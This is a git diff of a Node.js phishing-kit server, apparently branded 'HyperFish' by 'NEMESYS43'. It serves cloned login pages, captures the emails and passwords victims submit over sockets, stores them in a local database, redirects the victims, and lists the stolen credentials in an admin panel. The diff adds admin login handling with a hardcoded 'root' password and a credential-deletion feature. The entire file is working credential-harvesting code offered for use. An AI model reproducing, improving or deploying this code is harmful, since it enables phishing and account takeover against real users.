@@ -1,4 +1,5 @@
 var express = require('express');
+const favicon = require('express-favicon');
 var keypress = require('keypress');
 var app = express();
 var admin_app = express();
@@ -13,6 +14,9 @@ var type = args.kind
 var Nedb = require('nedb')
 var webUi = "False";
 var endDestination 
+let loginTrue;
+
+var webUserName = "NEMESYS43"
 var art1 = `
 ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
 ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝██║  ██║
@@ -79,6 +83,7 @@ if(args.webui){
 
 app.get('/', function(req, res){
   app.use(express.static(__dirname + '/' + type));
+  app.use(favicon(__dirname + '/' + type + '/favicon.ico')); 
   res.sendFile(__dirname + '/'+ type +'/index.html')
 });
 app.get('/adminPanel', function(req, res){
@@ -104,8 +109,8 @@ app.get('/adminPanel', function(req, res){
         socket.on('Password',function(password, from){
 
           console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password) + ' from ' + from);
-          gmail.insert({from: from, gmail: storedEmail, password: password }, function (err) {});
-          socket.emit('newData')
+          credentials.insert({from: from, email: storedEmail, password: password }, function (err) {});
+          newData()
           socket.emit('sendToEnd',endDestination)
 
         })
@@ -113,23 +118,69 @@ app.get('/adminPanel', function(req, res){
         socket.on('allCreds',function(from,email,password){
 
           console.log(colors.green('[+]') + colors.white('Captured Credentials -> ')+ colors.blue('Username :' + email + ' Password : ' + password) + ' from ' + from);
-          gmail.insert({from: from, gmail: email, password: password }, function (err) {});
+          credentials.insert({from: from, email: email, password: password }, function (err) {});
           socket.emit('sendToEnd',endDestination)
-
+          newData()
         })
 
-        socket.on('queryCredentials', function(){
-
-          gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
+        function queryCredentials(){
+          credentials.find({}).sort({email: 1}).exec(function(err, docs) {  
             docs.forEach(function(d){
-              socket.emit('queriedCredentials',d.from, d.gmail, d.password)
+              socket.emit('queriedCredentials',d.from, d.email, d.password, d._id)
             });  
-
           });
-
+        }
+        function newData(){
+          socket.broadcast.emit('newData')
+        }
+        socket.on('queryCredentials', function(){
+          queryCredentials();
         })
-
+        socket.on('deleteCredential', function(id){
+         credentials.remove({ _id: id }, function(err, numDeleted) {  
+            console.log("deleted user with id " + id)
+          });
+        })
+        socket.on('logout', function(){
+          loginTrue = "false"
+        })
+        socket.on('checkLogin',function(password){
+          console.log(password)
+          webUser.find({}, function(err, docs) {  
+            
+            docs.forEach(function(d) {
+                console.log('Found user:', d.username, d.password);
+                var username = "NEMESYS43"
+                if(username == d.username && password == d.password){
+                  console.log("YEP")
+                   loginTrue = "true"
+                  
+                }else{
+                  console.log("hell Naw")
+                }
+            });
+            if(loginTrue == "true"){
+              socket.emit('loginTrue')
+            }
+          });
+        })
+        socket.on('checkChangePassword',function(oldPassword, newPassword){
+          console.log(oldPassword)
+          console.log(newPassword)
+          if(oldPassword.length <=3 || newPassword.length <= 3){
+            socket.emit('changePasswordError')
+            console.log("error")
+          }else{
+          webUser.find({ password: { $exists: password }}, function(err, docs) {  
+            docs.forEach(function(d) {
+                console.log('Found user:', d.username);
+                socket.emit('loginTrue')
+              });
+            });
+          }
+        })
       });
+
 
 
   app.set('port', process.env.PORT || 3000);
@@ -139,8 +190,11 @@ app.get('/adminPanel', function(req, res){
   console.log(colors.blue.bold(art1) + colors.cyan('   by NEMESYS43'))
   console.log(colors.yellow.bold('                       ' + selectedMOTD));
   console.log('\n\n\n')
-  gmail = new Nedb({ filename: 'db/gmail.db', autoload: true });
+  credentials = new Nedb({ filename: 'db/credentials.db', autoload: true });
   webUser = new Nedb({ filename: 'db/webUser.db', autoload: true });
+
+  webUser.insert({username: webUserName, password: "root"}, function (err) {});
+
   if (sites.indexOf(type) >= 0) {
     console.log(colors.green('[+]') + colors.white(' Found Site '+ type));
     keypress(process.stdin);
@@ -167,8 +221,8 @@ function showLog(){
 
   var table = new Table({head: ['From','Username', 'Password'], colWidths: [35, 35,35]});
 
-    gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
-      docs.forEach(function(d) {table.push([d.from,d.gmail, d.password]);  
+    credentials.find({}).sort({email: 1}).exec(function(err, docs) {  
+      docs.forEach(function(d) {table.push([d.from,d.email, d.password]);  
     });
     console.log(table.toString());
 });
